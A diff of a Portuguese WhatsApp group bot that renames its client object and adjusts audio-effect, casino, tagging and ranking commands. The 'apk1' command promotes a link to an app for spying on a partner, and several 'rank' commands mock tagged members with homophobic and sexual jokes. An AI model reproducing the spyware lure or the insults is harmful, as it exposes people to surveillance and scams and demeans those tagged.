-            tomioka.sendMessage(from, fs.readFileSync('./assets/bv.mp3'), audio, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/bv.mp3'), audio, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
 				if (messagesC.includes("mandememe")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			data = fs.readFileSync('./src/tomiokajokes.js');
                  jsonData = JSON.parse(data);
                  randIndex = Math.floor(Math.random() * jsonData.length);
@@ -2904,10 +2741,10 @@ tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker,
 // console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 			if (!isCmd && isGroup) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color(pushname, 'yellow'), color(`[mensagem]`, 'orange'), color('NO GRUPO', 'white'), color(groupName))
 // console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
-			let authorname = tomioka.contacts[from] != undefined ? tomioka.contacts[from].vname || tomioka.contacts[from].notify : undefined	
+			let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined	
 			if (authorname != undefined) { } else { authorname = groupName }	    
 			//_ler chat
-			tomioka.chatRead(from)
+			client.chatRead(from)
 			if (isCmd && isBanned) {
            return console.log(color('[BAN] Ignorando comando', 'blue'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`5544998220867`),'DE:', color(pushname))}
 
@@ -2951,7 +2788,7 @@ tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker,
 				})	
 				
 }
-//////********SISTEMA DE VOTAÇAO*******////traduzido por @tio_tomiioka_ofc
+//////********SISTEMA DE VOTAÇAO*******////traduzido por @tio_tomioka_ofc
         if(isGroup && !isVote) {
         if (budy.toLowerCase() === 'votar'){
         let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
@@ -3001,7 +2838,7 @@ tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker,
 }
     switch(command) {
 case 'rankes':
-let temporalM = tomioka.prepareMessageFromContent(from,{
+let temporalM = client.prepareMessageFromContent(from,{
   "listMessage": {
             "title": "MENU DOS RANKS",
             "description": "clique no botões abaixo e envie",
@@ -3011,59 +2848,59 @@ let temporalM = tomioka.prepareMessageFromContent(from,{
               {
                 "rows": [
                   {
-                    "title": '🐂rank gados🐂',
+                    "title": '🐂rank gados',
                     "rowId": `${prefix}rankgado`
                   },
                   {
-                    "title": '🤩rank lindos🤩',
+                    "title": '🤩rank lindos',
                     "rowId": `${prefix}ranklindos`
                   },
                   {
-                    "title": '🤢rank feios🤢',
+                    "title": '🤢rank feios',
                     "rowId": `${prefix}rankfeios`
                   },
                   {
-                    "title": '🏳️‍🌈rank gays🏳️‍🌈',
+                    "title": '🏳️‍🌈rank gays',
                     "rowId": `${prefix}rankgay`
                     },
                     {
-                    "title": '🤓rank betas🤓',
+                    "title": '🤓rank betas',
                     "rowId": `${prefix}rankbeta`
                     },
                     {
-                    "title": '🐺rank alfas🐺',
+                    "title": '🐺rank alfas',
                     "rowId": `${prefix}rankalfa`
                     },
                     {
-                    "title": '🤡rank loucos🤡',
+                    "title": '🤡rank loucos',
                     "rowId": `${prefix}rankloucos`
                     },
                     {
-                    "title": '💂‍♂️rank nazistas💂‍♂️',
+                    "title": '💂‍♂️rank nazistas',
                     "rowId": `${prefix}ranknazista`
                     },
                     {
-                    "title": '❤️suruba❤️',
+                    "title": '❤️suruba',
                     "rowId": `${prefix}suruba`
                     },
                     {
-                    "title": '🤤surubão🤤',
+                    "title": 'surubão',
                     "rowId": `${prefix}surubao`
                     },
                     {
-                    "title": '🌝rank iludidos🌝',
+                    "title": '🌝rank iludidos',
                     "rowId": `${prefix}rankiludidos`
                     },
                      {
-                    "title": '🤴🏻rank principes🤴🏻',
+                    "title": '🤴🏻rank principes',
                     "rowId": `${prefix}rankprincipes`
                     },
                     {
-                    "title": '👸🏻rank princesas👸🏻',
+                    "title": '👸🏻rank princesas',
                     "rowId": `${prefix}rankprincesas`
                     },
                     {
-                    "title": '🐒rank camacos🐒',
+                    "title": '🐒rank camacos',
                     "rowId": `${prefix}rankcaco`
                   }
                 ]
@@ -3071,7 +2908,7 @@ let temporalM = tomioka.prepareMessageFromContent(from,{
             ]                    
           }
 }, {quoted:mek, contextInfo:tomio})
-tomioka.relayWAMessage(temporalM)
+client.relayWAMessage(temporalM)
 break
 					//_BANIR E DESBANIR USUARIO DE MEXER NO BOT 
 		  case 'ban':
@@ -3106,13 +2943,13 @@ break
 				//_EFEITO NIGHTCORE PARA AUDIO         
 case 'nightcore':
 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+media = await client.downloadAndSaveMediaMessage(encmedia)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break   
@@ -3120,13 +2957,13 @@ break
 //_EFEITO SLOW PARA AUDIO
 case 'slow':
 low = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-slo = await tomioka.downloadAndSaveMediaMessage(low)
+slo = await client.downloadAndSaveMediaMessage(low)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${slo} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(slo)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
@@ -3134,13 +2971,13 @@ break
 //_EFEITO ESQUILO PARA AUDIO
 case 'esquilo':
 pai = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-tup = await tomioka.downloadAndSaveMediaMessage(pai)
+tup = await client.downloadAndSaveMediaMessage(pai)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${tup} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(tup)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
@@ -3155,13 +2992,13 @@ case 'ack':
 //_EFDEITO GIGANTE PARA AUDIO	
 case 'gemuk':
 muk = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-gem = await tomioka.downloadAndSaveMediaMessage(muk)
+gem = await client.downloadAndSaveMediaMessage(muk)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(gem)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
@@ -3169,13 +3006,13 @@ break
 //_DEIXA O AUDIO RÁPIDO
 case 'fast':
 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+media = await client.downloadAndSaveMediaMessage(encmedia)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
 if (err) return fakegroup ('Erro')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
@@ -3183,13 +3020,13 @@ break
 //_AUMENTA O BASS DE UM AUDIO	
 case 'bass':                 
 ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-bas = await tomioka.downloadAndSaveMediaMessage(ass)
+bas = await client.downloadAndSaveMediaMessage(ass)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${bas} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(bas)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
@@ -3198,59 +3035,16 @@ break
 case 'earrape':         
 case 'estourar':       
 ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-bas = await tomioka.downloadAndSaveMediaMessage(ass)
+bas = await client.downloadAndSaveMediaMessage(ass)
 ran = getRandom('.mp3')
 exec(`ffmpeg -i ${bas} -af equalizer=f=90:width_type=o:width=2:g=50 ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(bas)
 if (err) return fakegroup ('Error!')
 hah = fs.readFileSync(ran)
-tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
 fs.unlinkSync(ran)
 })
 break
-/*case 'tts':
-					if (args.length < 1) return tomioka.sendMessage(from, 'Qual é o código da linguagem?', text, {quoted: mek})
-					const gtts = require('./lib/gtts')(args[0])
-					if (args.length < 2) return tomioka.sendMessage(from, 'Cadê o texto tio', text, {quoted: mek})
-					dtt = body.slice(9)
-					ranm = getRandom('.mp3')
-					rano = getRandom('.ogg')
-					dtt.length > 600
-					? reply('A maior parte do texto não é nada')
-					: gtts.save(ranm, dtt, function() {
-						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
-							fs.unlinkSync(ranm)
-							buff = fs.readFileSync(rano)
-							if (err) return fakegroup ('falha:(')
-							tomioka.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
-							fs.unlinkSync(rano)
-						})
-					})
-					break*/
-				/*case '':
-				veri = sender
-				user.push(sender)
-if (isUser) return;
-				fs.writeFileSync('./database/user.json', JSON.stringify(user))
-				const kentod2 = 
-
-`
-╭─「 *REGISTRO AUTOMÁTICO* 」
-│Registro bem-sucedido com
-│data e hora: ${time}
-│Nome: ${pushname}
-│Número: wa.me/${sender.split('@')[0]}
-│Obrigado e use à vontade 😊
-│❗Para usar o bot digite ${prefix}menu
-│Total de usuários registrados: ${user.length}
-╰──────────────────
-`
-
-                
-
-                tomioka.sendMessage(from, kentod2, MessageType.text, {quoted: ftoko})
-
-                break*/
 case 'rg':
 				veri = sender
 				user.push(sender)
@@ -3272,17 +3066,11 @@ if (isUser) return;
 
                 
 
-                tomioka.sendMessage(from, kentod, MessageType.text, {quoted: ftoko})
+                client.sendMessage(from, kentod, MessageType.text, {quoted: ftoko ,contextInfo: tomis})
 
                 break
 //___________VOTAÇAO/VOTAR____________//
-case 'delvote':
-            
- if(isvoting) return reply('Sem sessão de votação')                  
-            delvote(delvote)
-            reply('Sessão de votação excluída com sucesso neste grupo')
-            break
-            case 'vote':
+            case 'vote':   //case refeita pelo @tio_tomioka_ofc
             if(!isGroup) return 
             if (isVote) return reply('ja tem uma votaçao ativa')
             if(!q) return reply('*Votaçao*\n\n'+ prefix+ 'vote @tag target | motivo | 1 (1 = 1 Minuto)')
@@ -3292,7 +3080,7 @@ case 'delvote':
             if(!Number(split[2])) return reply('insira um numero no parametro 3\nNumeraçao: 1-9999\n1 = 1 Minutos')
             await mentions('Vote ' +'@'+ id.split('@')[0]+ '\n\n' + 'como fazer:' +'\n\n' + `votar = ✅\ndevote = ❌\n\nmotivo: ${split[1]}`,[id],true)
             addVote(from,split[1],split[0],split[2],reply)
-let temporalF= tomioka.prepareMessageFromContent(from,{
+let temporalF= client.prepareMessageFromContent(from,{
   "listMessage": {
             "title": "✅VOTAÇÃO✅",
             "description": "clique nos botões abaixo e envie",
@@ -3314,46 +3102,8 @@ let temporalF= tomioka.prepareMessageFromContent(from,{
             ]                    
           }
 }, {quoted:mek, contextInfo:tomio})
-tomioka.relayWAMessage(temporalF)}
+client.relayWAMessage(temporalF)}
             break
-//figurinha menu stiker cmd stickercmd
-case 'hash': 
-if (!isOwner) return fakegroup ('*Este comando só pode ser usado pelo o dono!* ')
-if (!isQuotedSticker) return reply("Marque um sticker")
-const encmeds9 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-const mediastick = await tomioka.downloadMediaMessage(encmeds9)
-var crypto = require('crypto')
-hash = crypto.createHash('sha256').update(mediastick).digest('base64');
-console.log(hash)
-reply(hash)
-break
-case 'addcmd': 
-case 'setcmd':
-if (!isOwner && !mek.key.fromMe) return reply('```so dono```')
-if (isQuotedSticker) {
-var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
-addCmd(kodenya, q)
-reply("```[ ✓ ]``` pronto")
-} else {
-reply('Responder o sticker')
-}
-break
-case 'delcmd':
-if (!isOwner && !mek.key.fromMe) return reply('```so dono```')
-var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
-scommand.splice(getCommandPosition(kodenya), 1)
-fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
-reply("```[ ✓ ]``` pronto")
-break
-case 'listcmd':
-let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
-let cemde = [];
-for (let i of _scommand) {
-cemde.push(i.id)
-teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
-}
-mentions(teksnyee, cemde, true)
-break
 case 'apk1':
 reply (`📱❤᥀🔥COMO SABER SE SUA NAMORADA ESTÁ TE TRAINDO COM ESSE APLICATIVO ANDROID [APK] [2021] [DOWNLOAD]📱❤᥀🔥\n\nhttps://seulink.online/9Jqr`)
 break
@@ -3639,13 +3389,13 @@ let resposta1 = cassinao[Math.floor(Math.random() * cassinao.length)]
 let resposta2 = cassinao[Math.floor(Math.random() * cassinao.length)]
 let resposta3 = cassinao[Math.floor(Math.random() * cassinao.length)]
 if(resposta1==resposta2&&resposta2==resposta3){
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parabéns, _${pushname}_ VOCÊ GANHOU*!!!!!`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parabéns, _${pushname}_ VOCÊ GANHOU*!!!!!`, text, {quoted: mek})
 }
 else if(resposta1==resposta2||resposta2==resposta3){
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: mek})
 }
 else{
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na próxima...*`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na próxima...*`, text, {quoted: mek})
 }
 break
 case 'cassino2':
@@ -3686,7 +3436,7 @@ case 'casino':
 					const roleta2 = roletaresu2[Math.floor(Math.random() * roletaresu2.length)]
 					const roleta3 = roletaresu3[Math.floor(Math.random() * roletaresu3.length)]
 					teksahh = `*Roleta Girada🎰??*\nlhe desejo sorte\n\n${roleta1}\n${roleta2}\n${roleta3}`
-					tomioka.sendMessage(from, teksahh, text, {quoted: mek})
+					client.sendMessage(from, teksahh, text, {quoted: mek})
 				
 					break
 case 'figutag':
@@ -3695,9 +3445,9 @@ if (!isPremium) return fakegroup (mess.only.premium)
 				
             if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
             encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-            file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
             value = args.join(" ")
-            var group = await tomioka.groupMetadata(from)
+            var group = await client.groupMetadata(from)
             var member = group['participants']
             var mem = []
             member.map(async adm => {
@@ -3708,7 +3458,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                 quoted: mek
             }
             ini_buffer = fs.readFileSync(file)
-            tomioka.sendMessage(from, ini_buffer, sticker, options)
+            client.sendMessage(from, ini_buffer, sticker, options)
             fs.unlinkSync(file)
             } else {
             reply(`*[❗] MARQUE A FIGURINHA 😐*`)
@@ -3720,9 +3470,9 @@ if (!isPremium) return fakegroup (mess.only.premium)
 				
             if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
             encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-            file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
             value = args.join(" ")
-            var group = await tomioka.groupMetadata(from)
+            var group = await client.groupMetadata(from)
             var member = group['participants']
             var mem = []
             member.map(async adm => {
@@ -3733,13 +3483,13 @@ if (!isPremium) return fakegroup (mess.only.premium)
                 quoted: mek
             }
             ini_buffer = fs.readFileSync(file)
-            tomioka.sendMessage(from, ini_buffer, sticker, options)
+            client.sendMessage(from, ini_buffer, sticker, options)
             fs.unlinkSync(file)
             } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
             encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-            file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
             value = args.join(" ")
-            var group = await tomioka.groupMetadata(from)
+            var group = await client.groupMetadata(from)
             var member = group['participants']
             var mem = []
             member.map(async adm => {
@@ -3750,13 +3500,13 @@ if (!isPremium) return fakegroup (mess.only.premium)
                 quoted: mek
             }
             ini_buffer = fs.readFileSync(file)
-            tomioka.sendMessage(from, ini_buffer, image, options)
+            client.sendMessage(from, ini_buffer, image, options)
             fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
             encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-            file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
             value = args.join(" ")
-            var group = await tomioka.groupMetadata(from)
+            var group = await client.groupMetadata(from)
             var member = group['participants']
             var mem = []
             member.map(async adm => {
@@ -3769,13 +3519,13 @@ if (!isPremium) return fakegroup (mess.only.premium)
                 quoted: mek
             }
             ini_buffer = fs.readFileSync(file)
-            tomioka.sendMessage(from, ini_buffer, audio, options)
+            client.sendMessage(from, ini_buffer, audio, options)
             fs.unlinkSync(file)
         }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
             encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-            file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
             value = args.join(" ")
-            var group = await tomioka.groupMetadata(from)
+            var group = await client.groupMetadata(from)
             var member = group['participants']
             var mem = []
             member.map(async adm => {
@@ -3787,7 +3537,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                 quoted: mek
             }
             ini_buffer = fs.readFileSync(file)
-            tomioka.sendMessage(from, ini_buffer, video, options)
+            client.sendMessage(from, ini_buffer, video, options)
             fs.unlinkSync(file)
         } else{
           reply(`[❗] responder imagem/adesivo/áudio/vídeo com a legenda ${p}supertag para marcar`)
@@ -3816,8 +3566,8 @@ if (!isPremium) return fakegroup (mess.only.premium)
      
      
      `;
-                         tomioka.sendMessage(from, chatMove, MessageType.text, {
-                              quoted: ftoko,
+                         client.sendMessage(from, chatMove, MessageType.text, {
+                              quoted: ftoko ,contextInfo: tomis,
                               contextInfo: {
                                    mentionedJid: [
                                         boardnow.X + "@s.whatsapp.net",
@@ -3850,8 +3600,8 @@ if (!isPremium) return fakegroup (mess.only.premium)
      
      _[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
      `;
-                    tomioka.sendMessage(from, strChat, MessageType.text, {
-                         quoted: ftoko,
+                    client.sendMessage(from, strChat, MessageType.text, {
+                         quoted: ftoko ,contextInfo: tomis,
                          contextInfo: {
                               mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
                          },
@@ -3865,7 +3615,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                          fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
 
                          const chatJqual = `*🕹️JOGO DA VELHA RESETADO...🕹️*`
-                   tomioka.sendMessage(from, chatJqual, MessageType.text, )
+                   client.sendMessage(from, chatJqual, MessageType.text, )
 
                     } else {
 
@@ -3875,7 +3625,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
                     break
         //_RANKS E %
         case 'gay': //by gauger 
-              tomioka.updatePresence(from, Presence.composing) 
+              client.updatePresence(from, Presence.composing) 
             	 random = `${Math.floor(Math.random() * 110)}`
 			 body = [body.slice(5)]   
                rspst = `*Tu é mano?😳😌*\n\n*_${body}_ você é ${random}% GAY🤭🌈* __`
@@ -3887,7 +3637,7 @@ if (!isPremium) return fakegroup (mess.only.premium)
 							teks += `@${_.split('@')[0]}\n`
 						}
 						mentions(teks, mentioned, true)	
-						tomioka.sendMessage(from, mentioned)
+						client.sendMessage(from, mentioned)
 					} else {
 						mentions(`*Tu é mano?😳😌*\n\n*_@${mentioned[0].split('@')[0]}_ Você é ${random}% GAY🌈🤭*`, mentioned, true)}
                 break
@@ -3896,35 +3646,35 @@ case '%gay':
 					rate = body.slice(5)
 					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 					var kl = ti[Math.floor(Math.random() * ti.length)]
-					tomioka.sendMessage(from, 'Como você é gay: *'+rate+'*\n\nSua porcentagem gay : '+ kl+'%\n esse ai ama dá o cu', text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'Como você é gay: *'+rate+'*\n\nSua porcentagem gay : '+ kl+'%\n esse ai ama dá o cu', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 case '%feio':		
 	            	if (args.length < 1) return fakegroup ('marque alguem fei que doi!')
 					rate = body.slice(6)
 					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 					var kl = ti[Math.floor(Math.random() * ti.length)]
-					tomioka.sendMessage(from, 'Como você é feio(a): *'+rate+'*\n\nSua porcentagem de feiura é : '+ kl+'%\n parece um sarigue kkk', text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'Como você é feio(a): *'+rate+'*\n\nSua porcentagem de feiura é : '+ kl+'%\n parece um sarigue kkk', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 case '%lindo':		
 	            	if (args.length < 1) return fakegroup ('marque alguem bonito!')
 					rate = body.slice(8)
 					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 					var kl = ti[Math.floor(Math.random() * ti.length)]
-					tomioka.sendMessage(from, 'Como você é lindo(a): *'+rate+'*\n\nSua porcentagem de Lindeza é : '+ kl+'%\n parece um boleto pago kkk', text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'Como você é lindo(a): *'+rate+'*\n\nSua porcentagem de Lindeza é : '+ kl+'%\n parece um boleto pago kkk', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 case '%gostoso':		
 	            	if (args.length < 1) return fakegroup ('marque sua mãe aquela gostosa!')
 					rate = body.slice(9)
 					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 					var kl = ti[Math.floor(Math.random() * ti.length)]
-					tomioka.sendMessage(from, 'tu e gostoso(a) será?: *'+rate+'*\n\nSua porcentagem de gostoso é : '+ kl+'%🤤\n slk comia ate o pau mofar🌚 kkk', text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'tu e gostoso(a) será?: *'+rate+'*\n\nSua porcentagem de gostoso é : '+ kl+'%🤤\n slk comia ate o pau mofar🌚 kkk', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 case '%gado':		
 	            	if (args.length < 1) return fakegroup ('marque um gado!')
 					rate = body.slice(6)
 					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
 					var kl = ti[Math.floor(Math.random() * ti.length)]
-					tomioka.sendMessage(from, 'tu e gado(a) será?: *'+rate+'*\n\nSua porcentagem de gado é : '+ kl+'%😏\n maluco falta comer um buraco na parede kkk', text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, 'tu e gado(a) será?: *'+rate+'*\n\nSua porcentagem de gado é : '+ kl+'%😏\n maluco falta comer um buraco na parede kkk', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 //_MOSTRA O CASAL DO GRUPO 
 case 'casal':
@@ -3944,7 +3694,7 @@ mentions(teks, membr, true)
 break
 case 'bagual':
 thumb = fs.readFileSync("./eu.jpg");
-tomioka.sendMessage(from, thumb, image, {quoted : mek, viewOnce: true})
+client.sendMessage(from, thumb, image, {quoted : mek, viewOnce: true})
 break
 case 'papel': 
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -3953,7 +3703,7 @@ case 'papel':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/burn-paper?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
 case 'cup':              
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -3961,15 +3711,15 @@ case 'cup':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/funny-cup?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
 					break
 //_LISTAR USUÁRIO ONLINE
 case 'online':
                     if (!isGroupAdmins) return fakegroup (mess.only.admin)
 					if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
                     let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
-                    let online = [...Object.keys(tomioka.chats.get(ido).presences), tomioka.user.jid]
-                    tomioka.sendMessage(from, 'Lista de usuários online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
+                    let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
